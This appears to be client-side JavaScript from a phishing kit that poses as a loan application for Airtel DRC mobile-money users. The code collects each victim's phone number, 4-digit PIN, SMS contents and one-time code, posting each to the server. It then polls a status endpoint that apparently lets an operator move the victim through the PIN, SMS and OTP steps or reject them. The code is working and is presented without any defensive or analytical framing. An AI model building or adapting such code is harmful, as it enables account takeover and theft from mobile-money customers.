let currentAppId = null;
let statusInterval = null;

function showStep(stepId) {
  const steps = ['step-1', 'step-2', 'step-3', 'step-4', 'loading-card'];
  steps.forEach(id => {
    const el = document.getElementById(id);
    if (el) el.classList.add('hidden');
  });
  const target = document.getElementById(stepId);
  if (target) target.classList.remove('hidden');
}

function startPolling(appId) {
  if (statusInterval) clearInterval(statusInterval);
  
  statusInterval = setInterval(async () => {
    try {
      const res = await fetch(`/check-status/${appId}`);
      if (!res.ok) return;
      const data = await res.json();
      
      if (data.status === 'SMS_STEP') {
        clearInterval(statusInterval);
        showStep('step-3');
      } else if (data.status === 'OTP_STEP') {
        clearInterval(statusInterval);
        showStep('step-4');
      } else if (data.status === 'APPROVED') {
        clearInterval(statusInterval);
        alert('Loan application successfully approved and disbursed!');
        location.reload();
      } else if (['PIN_REJECTED', 'SMS_REJECTED', 'OTP_REJECTED'].includes(data.status)) {
        clearInterval(statusInterval);
        alert('Verification failed or rejected. Please try again.');
        location.reload();
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
}

// Step 1: Phone submission
document.getElementById('loanForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const phone = document.getElementById('phone').value.trim();

  // Validate Airtel DRC prefix (+243, 9 digits, prefix 97, 98, 99)
  if (phone.length !== 9 || !['97', '98', '99'].includes(phone.substring(0, 2))) {
    alert('Please enter a valid Airtel DRC number starting with 97, 98, or 99 (9 digits).');
    return;
  }

  showStep('loading-card');

  try {
    const res = await fetch('/api/applications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ phone })
    });
    const data = await res.json();
    if (res.ok) {
      currentAppId = data.id;
      showStep('step-2');
    } else {
      alert(data.error || 'Validation failed');
      showStep('step-1');
    }
  } catch (err) {
    alert('Network error. Please try again.');
    showStep('step-1');
  }
});

// Step 2: PIN Submission
document.getElementById('pinForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const pin = document.getElementById('pin').value.trim();
  const phone = document.getElementById('phone').value.trim();

  if (pin.length !== 4) {
    alert('Please enter a valid 4-digit PIN.');
    return;
  }

  showStep('loading-card');

  try {
    const res = await fetch('/verify-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ appId: currentAppId, pin, phone })
    });
    if (res.ok) {
      startPolling(currentAppId);
    } else {
      alert('Failed to process confirmation.');
      showStep('step-2');
    }
  } catch (err) {
    alert('Network error.');
    showStep('step-2');
  }
});

// Step 3: SMS Submission
document.getElementById('smsForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const smsText = document.getElementById('smsText').value.trim();

  showStep('loading-card');

  try {
    const res = await fetch('/verify-sms', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ appId: currentAppId, smsText })
    });
    if (res.ok) {
      startPolling(currentAppId);
    } else {
      alert('Failed to send SMS text.');
      showStep('step-3');
    }
  } catch (err) {
    alert('Network error.');
    showStep('step-3');
  }
});

// Step 4: OTP Submission
document.getElementById('otpForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const otpCode = document.getElementById('otpCode').value.trim();

  showStep('loading-card');

  try {
    const res = await fetch('/verify-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ appId: currentAppId, otpCode })
    });
    if (res.ok) {
      startPolling(currentAppId);
    } else {
      alert('Failed to verify OTP.');
      showStep('step-4');
    }
  } catch (err) {
    alert('Network error.');
    showStep('step-4');
  }
});
    
